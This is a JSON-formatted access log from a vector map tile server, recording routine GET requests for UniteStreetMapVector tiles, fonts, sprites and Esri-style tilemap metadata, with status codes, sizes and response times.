{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/3/5/3.pbf 200 144363 - 10.524 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/3/6/4.pbf 200 95754 - 12.218 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/3/4/3.pbf 200 182650 - 13.067 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/3/6/3.pbf 200 239239 - 19.205 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/3/3/4.pbf 200 45683 - 20.696 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/3/3/3.pbf 200 58525 - 20.566 ms"}
{"level":"info","message":"GET /unvt/font/Open%20Sans%20Bold/256-511.pbf 304 - - 0.380 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/0/32/32?f=json 304 - - 0.533 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/0/32/32?f=json 304 - - 0.613 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/4/10/9.pbf 200 2403 - 2.772 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/4/9/9.pbf 200 50727 - 3.120 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/4/8/9.pbf 200 10633 - 3.653 ms"}
{"level":"info","message":"GET /unvt/font/NotoSans-Regular/0-255.pbf 304 - - 0.316 ms"}
{"level":"info","message":"GET /unvt/font/NotoSans-Regular/8192-8447.pbf 304 - - 0.352 ms"}
{"level":"info","message":"GET /unvt/font/NotoSans-Regular/256-511.pbf 304 - - 0.797 ms"}
{"level":"info","message":"GET /unvt/font/NotoSans-Regular/7936-8191.pbf 304 - - 0.497 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/0/0/32/32?f=json 304 - - 0.784 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/0/0/32/32?f=json 304 - - 0.570 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/32/32?f=json 200 2130 - 0.924 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/0/32/32/32?f=json 200 2129 - 2.023 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/32/32/32/32?f=json 304 - - 0.718 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/6/0/32/32/32?f=json 304 - - 0.462 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/7/64/64/32/32?f=json 200 2130 - 0.809 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/7/64/64/32/32?f=json 304 - - 0.537 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/7/78/66.pbf 404 59 - 2.567 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/7/78/65.pbf 200 32819 - 32.266 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/7/77/65.pbf 404 59 - 1.027 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/7/77/66.pbf 404 59 - 2.396 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/7/79/66.pbf 404 59 - 2.414 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/7/77/64.pbf 404 59 - 2.243 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/7/76/65.pbf 404 59 - 2.560 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/7/76/66.pbf 404 59 - 2.530 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/7/76/64.pbf 404 59 - 2.663 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/7/79/65.pbf 404 69 - 9.800 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/7/79/64.pbf 200 10891 - 8.270 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/7/78/64.pbf 200 82224 - 9.059 ms"}
{"level":"info","message":"GET /unvt/font/NotoSansDisplay-Medium/0-255.pbf 200 74619 - 2.912 ms"}
{"level":"info","message":"GET /unvt/font/NotoSans-Bold/0-255.pbf 200 80193 - 3.801 ms"}
{"level":"info","message":"GET /unvt/font/NotoSansDisplay-Regular/0-255.pbf 200 73384 - 4.695 ms"}
{"level":"info","message":"GET /unvt/font/NotoSans-Italic/0-255.pbf 200 79143 - 42.843 ms"}
{"level":"info","message":"GET /unvt/font/NotoSansDisplay-Regular/65024-65279.pbf 200 2467 - 1.053 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/6/39/33.pbf 404 59 - 1.473 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/6/38/33.pbf 404 59 - 1.149 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/6/38/32.pbf 404 59 - 0.437 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/6/39/32.pbf 200 64674 - 4.666 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/6/37/33.pbf 404 59 - 0.856 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/6/37/32.pbf 404 59 - 0.383 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/6/40/33.pbf 404 59 - 0.880 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/6/40/32.pbf 404 59 - 0.711 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/6/39/31.pbf 404 59 - 0.556 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/6/38/31.pbf 404 59 - 0.542 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/6/37/31.pbf 404 59 - 0.727 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/6/40/31.pbf 404 59 - 0.716 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json 200 3675 - 1.148 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/resources/styles/?f=json 200 215751 - 0.808 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/?f=json 200 3675 - 0.821 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.json 200 13660 - 0.644 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.png 200 24866 - 0.992 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json 304 - - 0.610 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/resources/styles/?f=json 304 - - 0.600 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/?f=json 304 - - 0.658 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.json 304 - - 0.446 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.png 304 - - 0.389 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.617 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.655 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 1.774 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 1.748 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.467 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.562 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.881 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.754 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.606 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.848 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.779 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 1.272 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 1.181 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.803 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.638 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 1.155 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 1.010 ms"}
{"level":"info","message":"GET /unvt/VT-open/zxy/UniteStreetMapVector/0/0/0.pbf 200 100708 - 4.414 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 1.425 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 1.272 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 1.131 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.575 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.465 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.811 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.463 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.604 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.930 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.565 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/8/16/8/8 404 82 - 0.571 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.577 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.580 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.768 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.419 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.556 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.481 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.491 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.662 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/5/16/16/8/8 404 83 - 0.483 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.512 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.452 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.480 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.672 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.521 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.615 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.468 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.548 ms"}
{"level":"info","message":"GET /unvt/rest/info?f=json 404 9 - 0.578 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json 304 - - 0.627 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/resources/styles/?f=json 304 - - 0.586 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/?f=json 304 - - 0.702 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.json 304 - - 0.459 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.png 304 - - 0.408 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.601 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.616 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.520 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.518 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.455 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.523 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.549 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.590 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.575 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 2.063 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 1.518 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.370 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.531 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.885 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.727 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.497 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.413 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.523 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.351 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.471 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.515 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.806 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.535 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.781 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.468 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.347 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.333 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.489 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.525 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.530 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.474 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.508 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.582 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.507 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.507 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.486 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.568 ms"}
{"level":"info","message":"GET /unvt/rest/info?f=json 404 9 - 0.927 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer?f=json 304 - - 0.733 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/resources/styles/?f=json 304 - - 0.710 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/?f=json 304 - - 0.651 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.json 304 - - 0.396 ms"}
{"level":"info","message":"GET /unvt/sprite-rev/sprite_S.png 304 - - 0.354 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.892 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.852 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.739 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.310 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.521 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 1.041 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.798 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.775 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.625 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.440 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.278 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.461 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.470 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/1/0/0/8/8 404 81 - 0.781 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.727 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.586 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.798 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.539 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.702 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/2/0/0/8/8 404 81 - 0.458 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 1.128 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.889 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 1.428 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.989 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.600 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.831 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.718 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.295 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 1.202 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.907 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.526 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.843 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.587 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.518 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.362 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.508 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.594 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.527 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.454 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.482 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.724 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.611 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.445 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/3/0/0/8/8 404 81 - 0.605 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.619 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.598 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.495 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.555 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.602 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.476 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/0/8/8/8 404 81 - 0.469 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer/tilemap/4/8/8/8/8 404 81 - 0.643 ms"}
{"level":"info","message":"GET /unvt/rest/services/esriIF/UniteStreetMapVector/VectorTileServer 304 - - 1.134 ms"}
{"level":"info","message":"GET / 404 9 - 0.768 ms"}
